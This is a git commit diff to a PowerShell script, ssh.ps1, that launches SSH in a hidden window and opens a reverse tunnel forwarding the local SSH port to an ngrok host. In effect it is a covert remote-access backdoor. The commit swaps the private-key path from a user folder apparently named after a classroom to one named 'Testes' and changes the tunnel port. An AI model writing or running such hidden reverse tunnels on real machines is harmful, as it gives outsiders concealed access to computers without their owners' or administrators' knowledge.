b3f268c8e4a612616e5a2395259c9c176b615a4d
usermants <sanchezguy@proton.me>
2025-09-05 21:35:37 -0300

    Update ssh.ps1

--- ssh.ps1
+++ ssh.ps1
@@ -2,7 +2,7 @@
 $sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"
 
 # Caminho da chave privada
-$keyPath = "C:\Users\SALA 1 ANO B\.ssh\revssh_key"
+$keyPath = "C:\Users\Testes\.ssh\revssh_key"
 
 # Executa SSH em segundo plano invisível
 Start-Process -FilePath $sshPath -ArgumentList `
@@ -13,6 +13,6 @@ Start-Process -FilePath $sshPath -ArgumentList `
     "-o", "ExitOnForwardFailure=yes", `
     "-R", "2222:localhost:22", `
     "logosofico@0.tcp.sa.ngrok.io", `
-    "-p", "16406", `
+    "-p", "19722", `
     "-N" `
     -WindowStyle Hidden
